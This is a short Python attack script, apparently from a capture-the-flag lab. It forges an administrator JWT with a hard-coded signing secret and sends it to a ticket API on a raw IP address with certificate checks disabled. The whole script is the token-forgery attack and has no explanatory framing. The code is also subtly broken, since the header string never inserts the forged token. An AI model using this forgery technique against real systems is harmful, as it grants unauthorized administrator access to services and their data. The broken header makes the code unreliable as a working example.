import jwt
import time

payload = {
    "userId": "8d649724-85ba-4395-a829-b549c32e7bc6",
    "username": "admin1",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 8 * 3600
}

token = jwt.encode(payload, "SecretKey-CriticalOps-2025", algorithm="HS256")

import requests

url = "https://94.237.54.192:48717/api/tickets"
headers = {
    "Authorization": "Bearer {token}"
}

r = requests.get(url, headers=headers, verify=False)
print(r.text)
